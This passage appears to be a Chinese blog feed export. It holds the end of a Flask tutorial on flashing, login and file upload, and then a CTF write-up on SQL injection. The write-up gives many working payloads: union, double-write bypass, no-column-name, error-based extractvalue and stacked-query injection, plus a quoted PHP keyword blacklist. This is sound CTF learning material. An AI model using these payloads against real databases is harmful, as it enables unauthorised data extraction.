class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Flask Message Flashing Example<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Do you want to <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span> <span class="token attr-value"><span class="token punctuation">=</span> <span class="token punctuation">"</span>&#123;&#123;  url_for('login') &#125;&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>b</span><span class="token punctuation">></span></span>log in?<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>b</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>login.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>   <span class="token doctype">&lt;!doctype html></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Login<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>   &#123;% if error %&#125;   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>strong</span><span class="token punctuation">></span></span>Error:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>strong</span><span class="token punctuation">></span></span> &#123;&#123;  error &#125;&#125;   &#123;% endif %&#125;   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span> <span class="token attr-value"><span class="token punctuation">=</span> <span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span> <span class="token attr-value"><span class="token punctuation">=</span> post</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dl</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dt</span><span class="token punctuation">></span></span>Username:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dt</span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dd</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span> <span class="token attr-value"><span class="token punctuation">=</span> text</span> <span class="token attr-name">name</span> <span class="token attr-value"><span class="token punctuation">=</span> username</span> <span class="token attr-name">value</span> <span class="token attr-value"><span class="token punctuation">=</span> <span class="token punctuation">"</span>&#123;&#123; request.form.username &#125;&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dd</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dt</span><span class="token punctuation">></span></span>Password:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dt</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dd</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span> <span class="token attr-value"><span class="token punctuation">=</span> password</span> <span class="token attr-name">name</span> <span class="token attr-value"><span class="token punctuation">=</span> password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dd</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dl</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span> <span class="token attr-value"><span class="token punctuation">=</span> submit</span> <span class="token attr-name">value</span> <span class="token attr-value"><span class="token punctuation">=</span> Login</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>访问<code>http://127.0.0.1:5000/</code>点击login后进入登录界面，随后如果输入的username和password不是admin的话会在界面上显示error消息，若登录成功则跳转到index页面上方显示登录成功消息</p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>upload.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype">&lt;!doctype html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Upload new File<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>&#123;% with messages = get_flashed_messages() %&#125;    &#123;% if messages %&#125;        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>          &#123;% for message in messages %&#125;          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>&#123;&#123;  message &#125;&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>          &#123;% endfor %&#125;        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>    &#123;% endif %&#125; &#123;% endwith %&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Upload new File<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span>post</span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span>multipart/form-data</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span>file</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span>file</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span>submit</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span>Upload</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><pre class="language-python" data-language="python"><code class="language-python">import osfrom flask import Flask, flash, request, redirect, url_for,send_from_directory,render_templatefrom werkzeug.utils import secure_filenameUPLOAD_FOLDER &#x3D; r&#39;E:\\flask\\upload\\&#39;ALLOWED_EXTENSIONS &#x3D; &#123; &#39;txt&#39;, &#39;pdf&#39;, &#39;png&#39;, &#39;jpg&#39;, &#39;jpeg&#39;, &#39;gif&#39;&#125;app &#x3D; Flask(__name__)app.config[&#39;MAX_CONTENT_LENGTH&#39;] &#x3D; 16 * 1024 * 1024app.config[&#39;UPLOAD_FOLDER&#39;] &#x3D; UPLOAD_FOLDERapp.secret_key &#x3D; os.urandom(12)def allowed_file(filename):  #判断上传的文件是否非法    if filename.rsplit(&#39;.&#39;, 1)[1].lower() in ALLOWED_EXTENSIONS:        return filename    else:        flash(&#39;illegal file&#39;)        return False@app.route(&#39;&#x2F;&#39;)def upload():    return render_template(&#39;upload.html&#39;)@app.route(&#39;&#x2F;&#39;, methods&#x3D;[&#39;GET&#39;, &#39;POST&#39;])def upload_file():    if request.method &#x3D;&#x3D; &#39;POST&#39;:        # check if the post request has the file part        if &#39;file&#39; not in request.files:             flash(&#39;No file part&#39;)            return redirect(url_for(&#39;upload&#39;))        file &#x3D; request.files[&#39;file&#39;]          # if user does not select file, browser also        # submit an empty part without filename        if file.filename &#x3D;&#x3D; &#39;&#39;:            flash(&#39;No selected file&#39;)            return redirect(request.url)        if file and allowed_file(file.filename):              filename &#x3D; secure_filename(file.filename)            file.save(os.path.join(app.config[&#39;UPLOAD_FOLDER&#39;], filename))#save方法保存文件            return redirect(url_for(&#39;uploaded_file&#39;,filename&#x3D;filename))    return redirect(url_for(&#39;upload&#39;))@app.route(&#39;&#x2F;uploads&#x2F;&lt;filename&gt;&#39;)def uploaded_file(filename):    return send_from_directory(app.config[&#39;UPLOAD_FOLDER&#39;],filename)if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    app.run(&#39;0.0.0.0&#39;,debug &#x3D; True)</code></pre><p>不得不说，官方的代码还是要强一些，当上传为空时会报错，非法文件也会报错，但上传成功后跳转到上传的文件url处</p><p> <code>UPLOAD_FOLDER</code> 是上传文 件要储存的目录， <code>ALLOWED_EXTENSIONS</code> 是允许上传的文件扩展名的集合，<code>MAX_CONTENT_LENGTH</code>是限制的上传文件的大小</p><h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><ul><li><strong>Flask Mail</strong> - 为Flask应用程序提供SMTP接口</li><li><strong>Flask WTF</strong> - 添加WTForms的渲染和验证</li><li><strong>Flask SQLAlchemy</strong> - 为Flask应用程序添加SQLAlchemy支持</li><li><strong>Flask Sijax</strong> - Sijax的接口 - Python/jQuery库，使AJAX易于在Web应用程序中使用</li></ul><p>参考链接：</p><blockquote><p><a href="https://dormousehole.readthedocs.io/en/latest/index.html">https://dormousehole.readthedocs.io/en/latest/index.html</a>     （官方文档）</p><p><a href="https://www.w3cschool.cn/flask/">https://www.w3cschool.cn/flask/</a>   （W3Cschool教程）</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-SQL注入</title>
      <link href="/posts/e73517db/"/>
      <url>/posts/e73517db/</url>
      
        <content type="html"><![CDATA[<h2 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h2><h3 id="极客大挑战—LoveSQL"><a href="#极客大挑战—LoveSQL" class="headerlink" title="极客大挑战—LoveSQL"></a>极客大挑战—LoveSQL</h3><p><strong>解题核心</strong> ———————- <a href="https://baijiahao.baidu.com/s?id=1595349117525189591&wfr=spider&for=pc"><strong>group_concat</strong>()</a></p><p>经过union测试发现有3个字段，并且2,3字段可查询，2字段查询结果看不清，用第3字段</p><p>查数据库：</p><pre class="language-sql" data-language="sql"><code class="language-sql">1&#39; union select null,null,group_concat(schema_name) from information_schema.schemata ;#</code></pre><p>查表：</p><pre class="language-sql" data-language="sql"><code class="language-sql">1&#39; union select null,null,group_concat(table_name) from information_schema.tables;#</code></pre><p>查列：</p><pre class="language-sql" data-language="sql"><code class="language-sql">1&#39; union select null,null,group_concat(column_name) from information_schema.columns;#</code></pre><p>最后password对应的表名应该是前面查询表名最后一个</p><p>查l0ve1ysq1表最后一列的字段内容：</p><pre class="language-sql" data-language="sql"><code class="language-sql">1&#39; union select null,null,group_concat(password) from l0ve1ysq1;#</code></pre><p>最终得到flag</p><h3 id="极客大挑战—BabySQL"><a href="#极客大挑战—BabySQL" class="headerlink" title="极客大挑战—BabySQL"></a>极客大挑战—BabySQL</h3><p><strong>解题核心</strong>—————–双写绕过</p><p>详细见CSDN上大佬的<a href="https://blog.csdn.net/whoim_i/article/details/102869687">文章</a>，另外附上文章的HTML文档</p><p>解题方法和上一个题目的差不多，只是这次多了个双写绕过</p><p>查库：</p><pre class="language-sql" data-language="sql"><code class="language-sql">1&#39; uniunionon seselectlect null,null,group_concat(schema_name) frfromom infoorrmation_schema.schemata ;#</code></pre><p>查表：</p><pre class="language-sql" data-language="sql"><code class="language-sql">1&#39; ununionion seselectlect null,null,group_concat(table_name) frfromom infoorrmation_schema.tables;#</code></pre><p>查列：</p><pre class="language-sql" data-language="sql"><code class="language-sql">1&#39; ununionion seselectlect null,null,group_concat(column_name) frfromom infoorrmation_schema.columns;#</code></pre><p>查字段，反复尝试后发现flag在表b4bsql中的password列</p><pre class="language-sql" data-language="sql"><code class="language-sql">1&#39; ununionion seselectlect null,null,group_concat(passwoorrd) frfromom b4bsql;#</code></pre><p>得到flag</p><h3 id="2019SWPU—Web1"><a href="#2019SWPU—Web1" class="headerlink" title="2019SWPU—Web1"></a>2019SWPU—Web1</h3><p><strong>解题核心</strong>—————–无列名查询</p><p>测试后发现登录界面做了严密的防注入措施，于是注册账号</p><p>登录后可申请发布广告</p><p>广告申请界面：</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/CYufWMHk5dvQZXp.png" style="zoom:67%;" loading="lazy"><p>随便申请一个后首页显示：</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/IRm9FwGvXH81ZiT.png" style="zoom:67%;" loading="lazy"><p>广告详情：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/MrPNK86afEWqQLj.png" alt loading="lazy"></p><p>在广告申请界面测试后发现存在SQL注入</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/RlfK1yp3mQCiV74.png" alt loading="lazy"></p><p>配合union查询查列数：</p><pre class="language-sql" data-language="sql"><code class="language-sql">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</code></pre><p>或</p><pre class="language-sql" data-language="sql"><code class="language-sql">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x2F;**&#x2F;&amp;&amp;&#x2F;**&#x2F;&#39;1&#39;&#x3D;&#39;1</code></pre><blockquote><p>注：</p><ul><li>过滤了–+和#，故闭合最后的单引号</li><li>过滤了空格用/**/分离参数</li></ul></blockquote><p>有22列，由广告详情界面显示可知，第2,3列可注入</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/E3zDiPNc7unoKsZ-1586919808082.png" alt loading="lazy"></p><p>查数据库库，数据库版本</p><pre class="language-sql" data-language="sql"><code class="language-sql">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</code></pre><pre class="language-sql" data-language="sql"><code class="language-sql">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,version(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</code></pre><p>查表：</p><pre class="language-sql" data-language="sql"><code class="language-sql">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;mysql.innodb_table_stats),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</code></pre><blockquote><p>注：</p><ul><li>此处利用无列名注入</li><li>过滤了information_scheam库的查询，故使用其它库进行查询，此题场景为buuctf上的复现题目，用到mysql库中的mysql.innodb_table_stats表（mysql在5.5.x版本后，默认使用innodb作为存储引擎），比赛时原题可用sys库中的sys.schema_auto_increment_columns表进行查询(mysql版本&gt;5.7时，新增了sys数据库，基础数据来自于performance_chema和information_schema两个库，但是本身数据库不存储数据)，查询语句和上面的一样</li><li>参考：<a href="https://mariadb.com/kb/en/mysqlinnodb_table_stats/">官方文档</a></li><li>参考：<a href="https://www.anquanke.com/post/id/193512">聊一聊bypass information_schema</a></li><li>参考：<a href="https://www.jb51.net/article/134678.htm">概述MySQL统计信息</a></li></ul></blockquote><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/LA2Tq1n3WSZd64r.png" alt loading="lazy"></p><p>查列</p><pre class="language-sql" data-language="sql"><code class="language-sql">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;union&#x2F;**&#x2F;select*from&#x2F;**&#x2F;users),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</code></pre><blockquote><p>注：无列名注入查询users表有3列，（测试时当查询users列数正确时会报不同的错误）</p></blockquote><p>列数错误时：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/LH4Zv1tMgyw9nFB.png" alt loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/WA96BqpKjUxmkET.png" alt loading="lazy"></p><p>然后再配合无列名注入注出user表中的flag</p><pre class="language-sql" data-language="sql"><code class="language-sql">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(b)&#x2F;**&#x2F;from(select&#x2F;**&#x2F;1,2&#x2F;**&#x2F;as&#x2F;**&#x2F;a,3&#x2F;**&#x2F;as&#x2F;**&#x2F;b&#x2F;**&#x2F;union&#x2F;**&#x2F;select*from&#x2F;**&#x2F;users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/OVRLtoYlm12nI4i.png" alt loading="lazy"></p><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="极客大挑战—HardSQL"><a href="#极客大挑战—HardSQL" class="headerlink" title="极客大挑战—HardSQL"></a>极客大挑战—HardSQL</h3><p><strong>解题核心</strong>—————–报错注入，异或(^)注入，like绕过，左右拼接</p><p>经过测试发现过滤了：空格，=，order by，union，and</p><p>用^异或操作代替union，用updatexml()或extractvalue()报错注入，以下均使用extractvalue()函数</p><p>查库：</p><pre class="language-sql" data-language="sql"><code class="language-sql">1&#39;^extractvalue(1,concat(1,(select(group_concat(database())))));#查当前数据库</code></pre><pre class="language-sql" data-language="sql"><code class="language-sql">1&#39;^extractvalue(1,concat(1,(select(group_concat(schema_name))from(information_schema.schemata))));#查所有数据库</code></pre><p>这里为什么没有显示当前geek数据库有点纳闷，可能是这个查询屏蔽了geek数据库</p><p>查表（like代替=进行查询）：</p><pre class="language-sql" data-language="sql"><code class="language-sql">1&#39;^extractvalue(1,concat(1,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like&#39;geek&#39;))));#查geek数据库下的表</code></pre><p>查列：</p><pre class="language-sql" data-language="sql"><code class="language-sql">1&#39;^extractvalue(1,concat(1,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like&#39;H4rDsq1&#39;))));#</code></pre><p>查字段（限制了显示的字符串数，利用left()，right()查询）：</p><pre class="language-sql" data-language="sql"><code class="language-sql">1&#39;^extractvalue(1,concat(1,(select(left(password,30))from(H4rDsq1))));#查左边1&#39;^extractvalue(1,concat(1,(select(right(password,30))from(H4rDsq1))));#查右边</code></pre><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><h3 id="2020ichunqiu新春公益赛—blacklist"><a href="#2020ichunqiu新春公益赛—blacklist" class="headerlink" title="2020ichunqiu新春公益赛—blacklist"></a>2020ichunqiu新春公益赛—blacklist</h3><p>这个题目可参考  [强网杯 2019]supersql</p><p>不过这题过滤的东西要多一些，常用的两种方法：</p><blockquote><p>预编译注入绕过关键词：set、prepare</p><p>改表名使flag所在的数据库变为题目查询的数据库：rename 、alter </p></blockquote><p>都被过滤用不了了</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/Juin3SGqkeVxfpX.png" alt loading="lazy"></p><p>这里就用到了mysq的新特性<code>handler</code>，<a href="https://dev.mysql.com/doc/refman/8.0/en/handler.html">详</a></p><pre class="language-sql" data-language="sql"><code class="language-sql">1&#39;;handler FlagHere open as cool;handler cool read first;handler cool read next;#</code></pre><p>通过以上语句可以得到flag，（比赛的时候没做出来，赛后没来得及看这题，早在一个多月前学长在群里发过这个新特性，当时太菜看不懂，现在想想可惜了 -.-）</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/7bxJWosa2PNCnRg.png" alt loading="lazy"></p><h3 id="2019SUCTF—EasySQL"><a href="#2019SUCTF—EasySQL" class="headerlink" title="2019SUCTF—EasySQL"></a>2019SUCTF—EasySQL</h3><p><strong>解题核心</strong>：</p><ul><li>堆叠注入</li><li>*的使用</li><li>sql_mode 的应用</li></ul><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/UyvVse24JRKQZFY.png" alt loading="lazy"></p><p>听说比赛的时候泄露了源码：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php    session_start();    include_once &quot;config.php&quot;;    $post &#x3D; array();    $get &#x3D; array();    global $MysqlLink;    &#x2F;&#x2F;GetPara();    $MysqlLink &#x3D; mysqli_connect(&quot;localhost&quot;,$datauser,$datapass);    if(!$MysqlLink)&#123;        die(&quot;Mysql Connect Error!&quot;);    &#125;    $selectDB &#x3D; mysqli_select_db($MysqlLink,$dataName);    if(!$selectDB)&#123;        die(&quot;Choose Database Error!&quot;);    &#125;    foreach ($_POST as $k&#x3D;&gt;$v)&#123;        if(!empty($v)&amp;&amp;is_string($v))&#123;            $post[$k] &#x3D; trim(addslashes($v));        &#125;    &#125;    foreach ($_GET as $k&#x3D;&gt;$v)&#123;        &#125;    &#125;    &#x2F;&#x2F;die();    ?&gt;&lt;html&gt;&lt;head&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;a&gt; Give me your flag, I will tell you if the flag is right. &lt;&#x2F; a&gt;&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt;&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;query&quot;&gt;&lt;input type&#x3D;&quot;submit&quot;&gt;&lt;&#x2F;form&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;&lt;?php    if(isset($post[&#39;query&#39;]))&#123;        $BlackList &#x3D; &quot;prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\&quot;&quot;;        &#x2F;&#x2F;var_dump(preg_match(&quot;&#x2F;&#123;$BlackList&#125;&#x2F;is&quot;,$post[&#39;query&#39;]));        if(preg_match(&quot;&#x2F;&#123;$BlackList&#125;&#x2F;is&quot;,$post[&#39;query&#39;]))&#123;            &#x2F;&#x2F;echo $post[&#39;query&#39;];            die(&quot;Nonono.&quot;);        &#125;        if(strlen($post[&#39;query&#39;])&gt;40)&#123;            die(&quot;Too long.&quot;);        &#125;        $sql &#x3D; &quot;select &quot;.$post[&#39;query&#39;].&quot;||flag from Flag&quot;;        mysqli_multi_query($MysqlLink,$sql);        do&#123;            if($res &#x3D; mysqli_store_result($MysqlLink))&#123;                while($row &#x3D; mysqli_fetch_row($res))&#123;                    print_r($row);                &#125;            &#125;        &#125;while(@mysqli_next_result($MysqlLink));    &#125;    ?&gt;</code></pre><p>mysqli_multi_query()  函数执行一个或多个针对数据库的查询。多个查询用分号进行分隔。有这个函数即可想到利用堆叠注入</p><p>sql_mode 是一组mysql支持的基本语法及校验规则</p><p><strong>mysql中sql_mode值举例：</strong> </p><p><strong>STRICT_TRANS_TABLES：</strong> </p><blockquote><p>mysql存储引擎的概念<br>innodb存储引擎（oltp系统）<br>myisam存储引擎（非实时交易）<br>对于innodb存储引擎来说当设置sql_mode有该值是，当发现插入数据无法正常插入，会报错，并且回滚所有参数（加入一个插入操作往数据表中插入10行数据，但是在第五行数据不能插入，此时会终止插入操作并且会回滚插入成功的数据）<br>对于myisam存储引擎：当插入数据是第一行无法插入时，报错并且回滚插入数据当插入的数据不是第一行无法插入时，此时mysql数据库会将无法插入的值转换为近似值或者发生隐式类型转换，并且不会报错 </p></blockquote><p><strong>STRICT_ALL_TABLES：</strong> </p><blockquote><p>对于innodb存储引擎作用一致<br>对于myisam存储引擎：当插入不是第一行报错时，会将报错之前的数据保留，终止之后的插入操作 </p></blockquote><p><strong>NO_ENGINE_SUBSTITUTION：</strong> </p><blockquote><p>当存储引擎被禁止或者未解析时，当使用时会报错 </p></blockquote><p><strong>only_for_group_by：</strong> </p><blockquote><p>当select字句中出现的单独列没有出现在group by字句中，此时就会报错 </p></blockquote><p><strong>NO_AUTO_CREATE_USER:</strong> </p><blockquote><p>禁止创建密码为空的用户 </p></blockquote><p><strong>NO_ZERO_IN_DATE：</strong> </p><blockquote><p>在严格模式下，不允许日期和月份为零 </p></blockquote><p><strong>NO_ZERO_DATE：</strong> </p><blockquote><p>设置该值，mysql数据库不允许插入零日期，插入零日期会抛出错误而不是警告 </p></blockquote><p><strong>ERROR_FOR_DIVISION_BY_ZERO：</strong> </p><blockquote><p>在INSERT或UPDATE过程中，如果数据被零除，则产生错误而非警告。如果未给出该模式，那么数据被零除时MySQL返回NULL </p></blockquote><p><strong>NO_AUTO_CREATE_USER：</strong> </p><blockquote><p>禁止GRANT语句创建密码为空的用户 </p></blockquote><p><strong>PIPES_AS_CONCAT：</strong> </p><blockquote><p>将“||”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似（本题要点） </p></blockquote><p><strong>ANSI_QUOTES：</strong> </p><blockquote><p>启用ANSI_QUOTES后，不能用双引号来引用字符串，因为它被解释为识别符</p></blockquote><p>于是有注入语句：</p><pre class="language-mssql" data-language="mssql"><code class="language-mssql">1;set sql_mode&#x3D;PIPES_AS_CONCAT;SELECT 1</code></pre><p>拼合起来就是：</p><pre><code>select 1;set sql_mode=PIPES_AS_CONCAT;SELECT 1||flag from Flag</code></pre><p>此时的select 1||flag from Flag就等同于select 1 from Flag和select flag from Flag的拼合</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/e6sQR1uwh3UA9v5.png" alt loading="lazy"></p><p>另外还有一个解就是*的用法：</p><p>注入：</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">*,1</code></pre><p>拼合起来就是：</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">select *,1||flag from Flag</code></pre><p>*为查询所有，此时的select *,1||flag from Flag就等同于select * from Flag</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/xLgmrQAq4CXcp2G.png" alt loading="lazy"></p><h3 id="2019强网杯—supersql"><a href="#2019强网杯—supersql" class="headerlink" title="2019强网杯—supersql"></a>2019强网杯—supersql</h3><p><strong>解题核心</strong>——————堆叠注入；详见大佬博客：<a href="https://www.cnblogs.com/0nth3way/articles/7128189.html">SQL注入-堆叠注入</a></p><p>由题意，得知这应该是一个sql注入的题目，点进去界面如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/Tdw4xkpqRJPmFQy.png" alt loading="lazy"></p><p>刚开始用SQLMap测试了一下，发现好像没啥用，于是按开F12</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/DBHQpKrU6AjybXo.png" alt loading="lazy"></p><p>嗯，确实，一个工具有啥灵魂O.O</p><p>测试单引号</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/5WiljO9kLTRwdqv.png" alt loading="lazy"></p><p>接着测试注释：</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;--+</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/lDUIhJOMKngXdsa.png" alt loading="lazy"></p><p>被过滤掉了</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;#</code></pre><p>#有效</p><p>尝试注入sql查询等语句，提示被过滤</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/2AlOtopcrP7UjBs.png" alt loading="lazy"></p><p>于是就用到前面提到了堆叠注入</p><p>首先列出所有数据库：</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;;show databases;#         显示如下</code></pre><p>列出所有表：</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;;show tables;#         显示如下</code></pre><p>列出表words中的所有列：</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;;show columns from words;#         显示如下</code></pre><p>列出表1919810931114514中所有的列：</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;;show columns from &#96;1919810931114514&#96;;#         